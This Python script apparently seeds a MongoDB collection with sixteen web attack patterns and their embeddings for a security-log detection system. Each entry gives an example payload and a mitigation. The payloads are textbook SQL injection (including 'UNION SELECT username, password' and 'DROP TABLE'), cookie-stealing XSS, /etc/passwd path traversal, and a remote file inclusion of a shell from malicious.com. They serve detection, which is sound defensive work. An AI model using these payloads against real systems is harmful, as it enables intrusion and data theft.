#!/usr/bin/env python3
import os
import sys
import logging
from pymongo import MongoClient, UpdateOne
import certifi
from dotenv import load_dotenv

# Ensure workspace root is in python path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.features.embedding_engine import EmbeddingEngine

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")


ATTACK_PATTERNS = [
    {
        "pattern_id": "sqli_boolean_or",
        "name": "Boolean-based SQL Injection",
        "category": "sqli",
        "description": "Using OR/AND statements that always evaluate to true (e.g., OR 1=1) to bypass authentication or extract data.",
        "payload_example": "/index.php?id=1 OR 1=1",
        "severity": "high",
        "mitigation": "Use parameterized queries / prepared statements. Implement strict input validation.",
    },
    {
        "pattern_id": "sqli_union_select",
        "name": "UNION-based SQL Injection",
        "category": "sqli",
        "description": "Exploiting SQL injection to combine the results of the original query with results from a malicious SELECT query using the UNION operator.",
        "payload_example": "/products.php?cat=1 UNION SELECT username, password FROM users",
        "severity": "high",
        "mitigation": "Use parameterized SQL queries. Enforce strict database permission models (least privilege).",
    },
    {
        "pattern_id": "sqli_stacked_query",
        "name": "Stacked Queries SQL Injection",
        "category": "sqli",
        "description": "Terminating the original query with a semicolon and appending a new malicious query (e.g., DROP TABLE or UPDATE).",
        "payload_example": "/users.php?id=5; DROP TABLE logs;",
        "severity": "critical",
        "mitigation": "Disable multi-query support in the database driver. Apply parameterized queries.",
    },
    {
        "pattern_id": "sqli_error_based",
        "name": "Error-based SQL Injection",
        "category": "sqli",
        "description": "Intentionally triggering a database error to extract schema details or table contents from the error message.",
        "payload_example": "/item.php?id=1' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "severity": "high",
        "mitigation": "Disable detailed database error messages in production. Use parameterized queries.",
    },
    {
        "pattern_id": "xss_script_tag",
        "name": "Stored or Reflected XSS via Script Tag",
        "category": "xss",
        "description": "Injecting executable JavaScript code inside script tags that run in the context of the user's browser session.",
        "payload_example": "/search.php?q=<script>alert(document.cookie)</script>",
        "severity": "high",
        "mitigation": "Context-aware HTML escaping/encoding. Implement Content Security Policy (CSP).",
    },
    {
        "pattern_id": "xss_html_event_handler",
        "name": "XSS via HTML Event Handler",
        "category": "xss",
        "description": "Using onload, onerror, onclick or other event handlers in HTML tags to execute malicious JavaScript.",
        "payload_example": "/profile.php?name=<img src=x onerror=alert('XSS')>",
        "severity": "high",
        "mitigation": "Sanitize HTML inputs using libraries like DOMPurify. Enforce a strong CSP.",
    },
    {
        "pattern_id": "xss_javascript_uri",
        "name": "XSS via JavaScript Protocol URI",
        "category": "xss",
        "description": "Using the javascript: pseudo-protocol within href or src attributes to execute arbitrary code when clicked or loaded.",
        "payload_example": "/redir.php?url=javascript:alert('XSS')",
        "severity": "high",
        "mitigation": "Validate and sanitize URLs (e.g., only allow http/https protocols). Escape outputs.",
    },
    {
        "pattern_id": "traversal_dotdot",
        "name": "Path Traversal / Directory Traversal",
        "category": "traversal",
        "description": "Accessing files outside the web root directory using relative path sequence patterns like ../../.",
        "payload_example": "/download.php?file=../../../../etc/passwd",
        "severity": "high",
        "mitigation": "Avoid passing user input directly to file APIs. Use a whitelist of files or canonicalize paths and verify they stay within the web root.",
    },
    {
        "pattern_id": "traversal_encoded",
        "name": "Encoded Path Traversal",
        "category": "traversal",
        "description": "Using URL-encoded or double URL-encoded representation of path separators to bypass simple string filters (e.g., %2e%2e%2f).",
        "payload_example": "/view.php?file=%252e%252e%252f%252e%252e%252fetc/passwd",
        "severity": "medium",
        "mitigation": "Perform input normalization (fully decode the path) BEFORE applying safety validations and filters.",
    },
    {
        "pattern_id": "traversal_absolute",
        "name": "Absolute File Path Reference",
        "category": "traversal",
        "description": "Directly referencing absolute sensitive system paths such as Windows boot files or Unix config files.",
        "payload_example": "/read.php?path=c:\\windows\\win.ini",
        "severity": "high",
        "mitigation": "Restrict file system permissions for the web server process. Enforce strict parameter validation.",
    },
    {
        "pattern_id": "scanner_sqlmap_scan",
        "name": "Automated SQLmap Scanner Request",
        "category": "scanner",
        "description": "Requests carrying custom headers or query parameters indicating automated vulnerability scans by SQLmap.",
        "payload_example": "/index.php?id=1 AND 1=1&User-Agent=sqlmap/1.4.12",
        "severity": "medium",
        "mitigation": "Implement rate limiting, deploy Web Application Firewall (WAF) rule sets, and monitor IP reputation lists.",
    },
    {
        "pattern_id": "scanner_nikto_scan",
        "name": "Nikto Vulnerability Scan Signature",
        "category": "scanner",
        "description": "Automated scan requests attempting to fetch common backup files, configuration scripts, or server details using Nikto signatures.",
        "payload_example": "/test.php?q=nikto_test_file&User-Agent=Mozilla/5.0 (Nikto/2.1.6)",
        "severity": "medium",
        "mitigation": "Filter traffic using WAF or block user agents known to be malicious/scanners.",
    },
    {
        "pattern_id": "sensitive_admin_access",
        "name": "Unauthorized Administrative Path Access",
        "category": "sensitive_path",
        "description": "Attempting to access administrative or management panel interfaces without authorization (e.g., phpmyadmin, wp-admin).",
        "payload_example": "/phpmyadmin/index.php",
        "severity": "medium",
        "mitigation": "Restrict access to administrative paths using IP whitelisting, VPN, or multi-factor authentication.",
    },
    {
        "pattern_id": "sensitive_config_access",
        "name": "Database/Config File Access",
        "category": "sensitive_path",
        "description": "Accessing sensitive configuration files, backup archives, or private keys directly from the web root.",
        "payload_example": "/.git/config",
        "severity": "critical",
        "mitigation": "Configure the web server to deny access to hidden files and directories (like .git, .env, and backups).",
    },
    {
        "pattern_id": "evasion_null_byte",
        "name": "Null Byte Injection Evasion",
        "category": "evasion",
        "description": "Injecting a null byte (%00 or \\x00) to terminate file path strings or command sequences in backend languages (e.g., C/PHP).",
        "payload_example": "/show.php?file=secret.pdf%00.jpg",
        "severity": "high",
        "mitigation": "Normalize input strings by removing null bytes before processing, or use modern language runtimes that are not null-terminated.",
    },
    {
        "pattern_id": "lfi_remote_inclusion",
        "name": "Local/Remote File Inclusion (LFI/RFI)",
        "category": "traversal",
        "description": "Including files from remote servers or local resources to execute unauthorized scripts or code.",
        "payload_example": "/load.php?page=http://malicious.com/shell.txt",
        "severity": "critical",
        "mitigation": "Disable allow_url_include in PHP configurations. Avoid dynamic file includes based on user input.",
    }
]


def seed_database():
    load_dotenv()
    mongodb_uri = os.getenv("MONGODB_URI")
    if not mongodb_uri:
        logging.error("MONGODB_URI environment variable not found in .env file!")
        sys.exit(1)

    db_name = os.getenv("MONGODB_DB_NAME", "security_logs")
    collection_name = "attack_patterns"

    logging.info("Initializing EmbeddingEngine...")
    engine = EmbeddingEngine()

    logging.info(f"Connecting to MongoDB database '{db_name}'...")
    client = MongoClient(mongodb_uri, tls=True, tlsCAFile=certifi.where())
    db = client[db_name]
    collection = db[collection_name]

    logging.info("Generating embeddings and preparing bulk update operations...")
    operations = []
    for pattern in ATTACK_PATTERNS:
        text_to_embed = f"{pattern['category']} {pattern['name']} {pattern['description']} {pattern['payload_example']}"
        logging.info(f"Generating embedding for attack pattern: {pattern['pattern_id']}")
        embedding = engine.get_embedding(text_to_embed)
        
        record = dict(pattern)
        record["embedding"] = embedding

        operations.append(
            UpdateOne({"pattern_id": pattern["pattern_id"]}, {"$set": record}, upsert=True)
        )

    if operations:
        logging.info(f"Executing bulk write of {len(operations)} attack patterns to '{collection_name}' collection...")
        result = collection.bulk_write(operations, ordered=False)
        logging.info(
            f"Seeding completed. Matched: {result.matched_count}, "
            f"Upserted: {result.upserted_count}, Modified: {result.modified_count}."
        )
    
    client.close()
    logging.info("MongoDB connection closed.")


if __name__ == "__main__":
    seed_database()
